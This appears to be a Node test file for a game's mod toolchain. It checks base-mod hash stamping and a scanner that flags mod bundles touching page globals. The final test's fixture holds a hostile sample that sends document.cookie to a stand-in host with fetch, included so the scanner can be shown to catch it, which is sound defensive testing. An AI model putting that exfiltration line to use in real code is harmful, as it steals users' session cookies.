// The game repo's side of the mod toolchain: the scanner that keeps a published bundle from
// reaching page globals, and the base-mod hashes a client build is stamped with. The registry's own
// tooling is tested in the spup-mods repo.

import {test} from "node:test";
import assert from "node:assert/strict";
import {createHash} from "node:crypto";
import {mkdirSync, mkdtempSync, rmSync, writeFileSync} from "node:fs";
import {tmpdir} from "node:os";
import {join} from "node:path";
import {freeIdentifiers} from "../../tools/mod-scan.js";
import {builtModHashes} from "../../vite.build-defines.js";

/**
 * A built base-mod directory the way publishBaseMods lays it out.
 * @param {object} t the test context, for cleanup
 * @param {string[]} names in order.json order
 * @returns {string}
 */
function writeDistMods(t, names) {
    const dir = mkdtempSync(join(tmpdir(), "spup-dist-mods-"));
    t.after(() => rmSync(dir, {recursive: true, force: true}));
    writeFileSync(join(dir, "order.json"), JSON.stringify(names));
    for (const name of names) {
        mkdirSync(join(dir, name));
        writeFileSync(join(dir, name, "mod.js"), `// ${name}\n`);
    }
    return dir;
}

test("a build's base-mod hashes are its bundles' digests, in loadout order", (t) => {
    const dir = writeDistMods(t, ["BaseGame", "Logistics"]);
    assert.deepEqual(builtModHashes(dir), [
        createHash("sha256").update("// BaseGame\n").digest("hex"),
        createHash("sha256").update("// Logistics\n").digest("hex"),
    ]);
});

test("reading base-mod hashes from a directory holding no build throws", (t) => {
    const dir = mkdtempSync(join(tmpdir(), "spup-dist-mods-"));
    t.after(() => rmSync(dir, {recursive: true, force: true}));
    assert.throws(() => builtModHashes(dir), /no built mods/);
});

test("the free-variable scan catches a bundle reaching page globals", () => {
    const clean = `
        export function createDeclaration(sdk) {
            const {ObjectType} = sdk;
            const names = [1, 2].map(value => String(value));
            for (const name of names) {
                JSON.stringify({name});
            }
            try {
                Math.round(1.5);
            } catch (problem) {
                console.error(problem);
            }
            class Local extends ObjectType {}
            return new Local();
        }
    `;
    assert.deepEqual([...freeIdentifiers(clean).keys()], []);

    const hostile = `
        export function createClient(sdk) {
            fetch("https://evil.example.com", {body: document.cookie});
            return new sdk.AbstractClientMod();
        }
    `;
    assert.deepEqual([...freeIdentifiers(hostile).keys()].sort(), ["document", "fetch"]);
});
